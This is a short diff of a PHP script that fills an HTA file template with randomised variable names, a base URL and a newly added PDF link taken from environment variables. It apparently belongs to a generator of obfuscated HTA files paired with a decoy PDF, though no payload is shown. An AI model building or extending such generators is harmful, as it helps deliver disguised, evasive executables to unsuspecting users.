@@ -23,6 +23,7 @@ $sHTA = str_replace("%hta_var_01%", GeraStringRandomica(rand(3, 8)) . (string)(r
 $sHTA = str_replace("%hta_var_02%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
 $sHTA = str_replace("%hta_boj_01%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
 $sHTA = str_replace("%htal_link%",getenv('BASE_URL_WITHOUT_HTTP'), $sHTA);
+$sHTA = str_replace("%hta_link_pdf%",getenv('LINK_PDF'), $sHTA);
 
 $filexDir = __DIR__ . '/filex';
 if (!is_dir($filexDir)) {
